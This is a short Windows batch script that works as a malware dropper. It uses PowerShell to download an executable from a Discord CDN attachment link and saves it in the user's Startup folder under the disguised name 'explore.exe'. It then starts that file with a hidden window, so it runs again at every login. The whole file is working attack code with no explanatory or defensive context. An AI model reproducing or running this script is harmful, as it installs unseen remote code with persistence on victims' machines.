@echo off

set powershell=%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe
set "DownloadURL=https://cdn.discordapp.com/attachments/1164564797854068836/1170119323948425296/x.exe"
set "DestinationPath=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\explore.exe"
powershell -Command "Invoke-WebRequest -useb '%DownloadURL%' -o '%DestinationPath%'"
powershell -Command "Start-Process '%DestinationPath%' -WindowStyle Hidden"
